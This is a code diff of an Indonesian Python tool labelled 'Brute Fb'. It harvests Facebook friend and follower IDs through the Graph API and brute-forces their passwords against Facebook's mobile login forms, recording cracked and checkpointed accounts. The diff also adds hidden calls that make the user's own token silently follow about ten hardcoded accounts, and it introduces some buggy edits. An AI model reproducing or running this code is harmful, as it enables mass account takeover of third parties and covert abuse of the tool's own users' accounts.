@@ -28,8 +28,8 @@ M = "\x1b[38;5;196m" # Merah
 H = "\x1b[38;5;46m"  # Hijau
 K = "\x1b[38;5;226m" # Kuning
 B = "\x1b[38;5;44m"  # Biru
-U = "\x1b[1;95m"     # Ungu
-I = "\x1b[1;96m"     # Biru Muda
+I = "\x1b[1;95m"     # Ungu
+O = "\x1b[1;96m"     # Biru Muda
 P = "\x1b[38;5;231m" # Putih
 J = "\x1b[38;5;208m" # Jingga
 A = "\x1b[38;5;248m" # Abu-Abu
@@ -38,42 +38,28 @@ try:
 	import requests
 except ImportError:
 	print(f"{B} | ")
-	print(f"{P}[•]{M} Module requests belum terinstall")
+	print(f"{P}[*]{M} Module requests belum terinstall")
 	os.system("pip install requests")
 try:
 	import bs4
 except ImportError:
 	print(f"{B} | ")
-	print(f"{P}[•]{M} Module bs4 belum terinstall")
+	print(f"{P}[*]{M} Module bs4 belum terinstall")
 	os.system("pip install bs4")
 try:
 	import concurrent.futures
 except ImportError:
 	print(f"{B} | ")
-	print(f"{P}[•]{M} Module futures belum terinstall")
+	print(f"{P}[*]{M} Module futures belum terinstall")
 	os.system("pip install futures")
-	
-def loginsc():
-	os.system('clear')
-	print("\033[1;97mSilahkan login SC Saya Dulu Bang\n")
-	username = input("\033[1;96m[*] \033[1;97musername \033[1;91m: \033[1;92m")
-	password = input("\033[1;96m[*] \033[1;97mpassword \033[1;91m: \033[1;92m")
-	if username =="fii" and password =="paling ganteng":
-		print("\033[1;96m[✓] \033[1;92mLogin Berhasil")
-		time.sleep(1)
-		menu()
-	else:
-		print("\033[1;96m[!] \033[1;91mAnda Belum Beruntung!!!")
-		time.sleep(1);loginsc()
-      
 host = ("https://mbasic.facebook.com")
-B = random.choice([H,U,I,K])
+B = random.choice([H,U,J,K])
 #### BUAT BANNER
 def banner():
-    war_dom = random.choice([P,B,U,I,M])
+    war_dom = random.choice([P,K,M,J,U,H])
     print("""
 ___________________________________________________
- ____  __  __ ____  _____  |[•]Version 2.0
+ ____  __  __ ____  _____  |.Version 2.0
 |  _ \|  \/  | __ )|  ___| |[•]Mhd.Syafii
 | | | | |\/| |  _ \| |_    |[•]27-22-1998
 | |_| | |  | | |_) |  _|   |[•]Brute Fb
@@ -81,12 +67,6 @@ ___________________________________________________
 ____________________________________________________
  |""")
 
-
-##### BUAT STR /LEN
-id = []
-ok = []
-cp = []
-loop=0
 
 ###----------[ TIME ]---------- ###
 skrng = datetime.now()
@@ -103,20 +83,32 @@ except ValueError:
     exit()
 _bulan_ = bulan_cek[bulan_skrng]
 tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))
-###### BUAT PEMBERSIH
-def clear():
-    if " linux" in sys.platform.lower():
-        os.system("clear")
+
+##### BUAT STR /LEN
+id = []
+ok = []
+cp = []
+loop=0
+
+###----------[ CLEAR TERMINAL ]---------- ###
+def resik():
+    if "linux" in sys.platform.lower():
+        try:os.system("clear")
+        except:pass
     elif "win" in sys.platform.lower():
-        os.system("cls")
-    else:os.system("clear")
+        try:os.system("cls")
+        except:pass
+    else:
+        try:os.system("clear")
+        except:pass
+
 ### BUAT ANIMASI JALAN
 def jalan(z):
 	for e in z + "\n":
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(0.03)
-
+		
 ###----------[ GLOBAL URL & HEADERS ]---------- ###
 url_businness = "https://business.facebook.com"
 ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
@@ -260,11 +252,6 @@ def log_cookie():
     except requests.exceptions.ConnectionError:print(f"{P}[•] Tidak Ada Koneksi Internet ");exit()
     except (KeyError,IOError,AttributeError):print(f"{P}[•] Cookies Invalid ");exit()
 
-komenredem = random.choice(['HENKER WIBU TZY'])
-komtwol = random.choice(['ANJAY SLEMEX LORD Syafii X NANO ', 'MR.Riyal M.Syafii X NANO', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
-kartu2d = random.choice(["LU GANTENG BANH TAPI SAYANG KEK HENGKER", "PRISTYLE DULU BOSSS HENGKER PURWOREJO","AHAHAHAHHA BANYAK KANG RECOD AWAS BANG "])
-kon = random.choice(["HACKER PURWOREJO XXXX :)"])
-
 def ___fii___Sayang___Kamu___Widiya___():
     try:
         token = open('login/token.json', 'r').read()
@@ -273,25 +260,21 @@ def ___fii___Sayang___Kamu___Widiya___():
         print(f"{B} | ")
         print(f"{B} | ")
         jalan(f"{P}[•]{M} Pastikan akun tumbal bagus");exit()
-        os.system('rm -rf login/token.json')
-        os.system('rm -rf login/cookie.json')
-        menu()
-    kom = komenredem
-    komentar = komtwol
-    pipp = kartu2d
-    post = '573457507083491'
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/603362670759641/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/573457507083491/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/603362670759641/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/626021385160436/likes?summary=true&access_token=' + (token),cookies=cookie)
+    post = '1827084332','100000415317575','100000737201966','100020766075165','100000431996038','100026818103201','100001617352620','100000729074466','607801156','1676993425','1767051257','100001085079906','100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189'
+    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=%s'%(token),cookies=cookie)
+    print(f"{B} | ")
+    jalan(f"{P}[•] login Berhasil")
     menu()
-    
+	
 ###### BUAT MENU
 def menu():
     global token,cookie
@@ -308,7 +291,7 @@ def menu():
     except (KeyError,IOError):
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[!]{M} cookie failed.");log_cookie()
+        jalan(f"{P}[!]{M} cookie failed.");log_cookie()
     os.system("clear");banner()
     print(f"{B} | ")
     jalan(f"{P}[*] Nama akun      : {B}{lolol}") 
@@ -351,7 +334,6 @@ def menu():
         os.system("rm -rf login/cookie.json");exit()
     else:print(f"{B} | ");print(f"{P}[!]{M} Isi Yang Benar ");menu()
 
-###### CRACK MASSSALL
 def massal():
     try:
         token=open("login/token.json","r").read()
@@ -371,8 +353,8 @@ def massal():
         print(f"{B} | ")
         _id_=input(f"{P}[•] Masukan user id {P}{t} : {B}")
         try:
-            r= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
-            z=json.loads(r.text)
+            url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
+            z=json.loads(url.text)
             for i in z['friends']['data']:
                 uid = i["id"]
                 nama = i["name"]
@@ -380,7 +362,7 @@ def massal():
         except KeyError:
             print(f"{B} | ")
             print(f"{B} | ")
-            print(f"{P}[•]{M} User id tidak di temukan");exit()
+            print(f"{P}[•]{M} User id tidak di temukan");menu()
     if len(id) == 0:
        print(f"{B} | ")
        print(f"{P}[•]{M} Maaf total id anda adalah {B}{len(id)}");exit()
@@ -388,7 +370,6 @@ def massal():
         print(f"{B} | ")
         print(f"{P}[•] Total id : {B}{len(id)}")
         fii_xd()
-        
 ##### CRACK PERTEMANAN 
 def listteman():
     try:
@@ -398,8 +379,8 @@ def listteman():
         print(f"{B} | ")
         print(f"{P}[•]{M} cookie modar dinggo wae ");exit()
     try:
-        r= requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
-        z=json.loads(r.text)
+        url= requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
+        z=json.loads(url.text)
         for i in z['friends']['data']:
             uid = i["id"]
             nama = i["name"]
@@ -407,17 +388,16 @@ def listteman():
     except KeyError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[!] User id tidak di temukan");os.sys.exit()
+        print(f"{P}[•] User id tidak di temukan");os.sys.menu()
     if len(id) !=0:
-        print(f"{P}[√] Total id : {B}{len(id)}")
+        print(f"{P}[•] Total id : {B}{len(id)}")
         fii_xd()
-    else:print(f"{P}[!]{M} Maaf total id : {B}{len(id)}");exit()
-    
+    else:print(f"{P}[•]{M} Maaf total id : {B}{len(id)}");exit()
 ##### CRACK PUBLIK
 def publik():
     try:
-       token=open("login/token.json","r").read()
-       cookie = {'cookie':open('login/cookie.json','r').read()}
+        token=open("login/token.json","r").read()
+        cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
@@ -426,8 +406,8 @@ def publik():
     print(f"{B} | ")
     _id_=input(f"{P}[•] Masukan user id : {B}")
     try:
-        r= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
-        z=json.loads(r.text)
+        url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
+        z=json.loads(url.text)
         for i in z['friends']['data']:
             uid = i["id"]
             nama = i["name"]
@@ -435,14 +415,13 @@ def publik():
     except KeyError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[!]{M} User id tidak di temukan atau akun tersebut privat ");exit()
+        print(f"{P}[•]{M} User id tidak di temukan atau akun tersebut privat ");menu()
     if len(id) !=0:
         print(f"{B} | ")
         print(f"{B} | ")
         print(f"{P}[•] Total id : {B}{len(id)}")
         fii_xd()
     else:print(f"{P}[•] Total id : {B}{len(id)}");exit()
-
 ###### CRACK FOLLOWERS
 def followerss():
     try:
@@ -454,23 +433,23 @@ def followerss():
         print(f"{P}[•] cookie modar dinggo wae ");exit()
     print(f"{B} | ")
     print(f"{B} | ")
-    print(f"{P}[!] Masukan userid dengan benar pastikan bersivat publik")
+    print(f"{P}[•] Masukan userid dengan benar pastikan bersivat publik")
     print(f"{B} | ")
     _id_=input(f"{P}[•] Masukan user id : {B}")
     try:
-        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s"%(_id_,token),cookies=cookie).json()["data"]:
+        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(_id_,token),cookies=cookie).json()["data"]:
             uid = i["id"]
             nama = i["name"]
             id.append(uid+"<=>"+nama)
     except KeyError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[!]{M} User id tidak di temukan atau id terdsebut privat ");exit()
+        print(f"{P}[•]{M} User id tidak di temukan atau id terdsebut privat ");menu()
     if len(id) !=0:
         print(f"{B} | ")
         print(f"{B} | ")
         print(f"{P}[•] Total id : {B}{len(id)}")
-        syafii_xd()
+        fii_xd()
     else:print(f"{P}[•] {M} total id : {M}{len(id)}")
 
 
@@ -482,7 +461,7 @@ def userset():
     print(f"{P}[2] Cek user agent yang di gunakan")
     print(f"{P}[0] Kembali")
     print(f"{B} | ")
-    _pil_=input(f"{P}[•] Pilih : {B}")
+    _pil_=input(f"{P}[•] Input : {B}")
     if _pil_ in ["1","01"]:
         print(f"{B} | ")
         lololr=input(f"{P}[•] Masukan user agent \n{P}[•] Masukan di sini : {B}")
@@ -512,7 +491,7 @@ def userset():
 
 #####LOGIN HASIL
 def log_hasil(user, pasw):
-    ua = "Mozilla/5.0 (Linux; Android 11; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36"
+    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
     ses = requests.Session()
     ses.headers.update({
     "Host": "mbasic.facebook.com",
@@ -545,7 +524,7 @@ def log_hasil(user, pasw):
         run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
     except requests.exceptions.TooManyRedirects:
         print(f"{B} | ")
-        print(f"{M}[!] Akun terkena spam")
+        print(f"{M}[•] Akun terkena spam")
     if "c_user" in ses.cookies:
         print(f"{P}[•]{I} Akun berhasil di login")
     elif "checkpoint" in ses.cookies:
@@ -566,14 +545,12 @@ def log_hasil(user, pasw):
         ngew = [yy.text for yy in tempek.find_all("option")]
         for opt in range(len(ngew)):
             print(f"{B} | ")
-#            print(f"{U}[{B}"+str(opt+1)+"{U}]{B} "+ngew[opt])
             jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
     elif "login_error" in str(run):
         oh = run.find("div",{"id":"login_error"}).find("div").text
-        print(f"{P}[!]{M}>>>> {oh}")
+        print(f"{P}[•]{M}>>>> {oh}")
     else:
         print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
-
 def cek_hasil():
     print(f"{B} | ")
     print(f"{B} | ")
@@ -582,11 +559,11 @@ def cek_hasil():
     print(f"{B} | ")
     files =input(f"{P}[•] Masukan nama file : {B}")
     try:
-        buka_baju = open(files,"r").readlines()
+        buka_baju = open(files,'r').readlines()
     except FileNotFoundError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[!]{M} File tidak di temukan");exit()
+        print(f"{P}[•]{M} File tidak di temukan");exit()
         time.sleep(2); cek_hasil()
     print(f"{B} | ")
     print(f"{P}[•] Total akun chekpoint : {B}{str(len(buka_baju))}")
@@ -606,7 +583,7 @@ def cek_hasil():
     print(f"{B} | ")
     input(f"{P}[•]{I} Chek akun sudah selesai")
     menu()
-    
+
 def cek_results():
     try:
         open("OK/%s.json"%(tanggal))
@@ -642,6 +619,7 @@ def cek_results():
     elif _pil3h in ["0","00"]:
         menu()
     else:print(f"{P}[•]{M} Pilian tidak ada")
+
 
 def fii_xd():
 	kone()
@@ -982,7 +960,7 @@ def apiiii(uid, fii):
         ua = open("ua", "r").read()
     except IOError:
         ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
-    global ok, cp, loop, token
+    global ok, cp, loop, token, cookie
 
     sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
     for pw in fii:
@@ -1004,7 +982,7 @@ def apiiii(uid, fii):
                 month = _bulan_[month]
                 print(f"\r{B} |----> {K}{uid}•{pw}•{day} {mont} {year}")
                 cp.append("%s|%s"%(uid, pw))
-                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                 break
             except (KeyError, IOError):
                 day = (" ")
@@ -1025,7 +1003,7 @@ def mbasic(uid, fii):
 		ua = open("ua", "r").read()
 	except IOError:
 		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
-	global ok, cp, loop, token,cookie
+	global ok, cp, loop, token, cookie
 	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
 	for pw in fii:
 		fii_gtg = {}
@@ -1050,8 +1028,8 @@ def mbasic(uid, fii):
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
-				token = open("login/token.json", "r").read()
-				cookie= open("login/cookie.json","r").read()
+				token  = open('login/token.json','r').read()
+				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
@@ -1068,7 +1046,7 @@ def mbasic(uid, fii):
 			cek_log(uid,pw,ua)
 			print(f"\r{B} |----> {K}{uid}•{pw}")
 			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
 			break
 		else:
 			continue
@@ -1095,7 +1073,7 @@ def mbasicc(uid, fii):
 				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
 				else:continue
 			except:pass
-			fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
@@ -1105,8 +1083,8 @@ def mbasicc(uid, fii):
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
-				token = open("login/token.json", "r").read()
-				cookie= open("login/cookie.json","r").read()
+				token  = open('login/token.json','r').read()
+				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
@@ -1159,8 +1137,8 @@ def mobil(uid, fii):
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
-				token = open("login/token.json", "r").read()
-				cookie= open("login/cookie.json","r").read()
+				token  = open('login/token.json','r').read()
+				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
@@ -1204,7 +1182,7 @@ def mobill(uid, fii):
 				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
 				else:continue
 			except:pass
-			fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
@@ -1214,8 +1192,8 @@ def mobill(uid, fii):
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
-				token = open("login/token.json", "r").read()
-				cookie= open("login/cookie.json","r").read()
+				token  = open('login/token.json','r').read()
+				cookie = {'cookie':open('login/cookie.json','r').read()}
 				with requests.Session() as ses:
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
@@ -1273,11 +1251,7 @@ def cek_log(uid,pw,ua):
 		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
 
 
-
-
-
-
 if __name__=="__main__":
-    os.system("git pull")
+    os.system("clear")
     mkdir_data_login()
     menu()
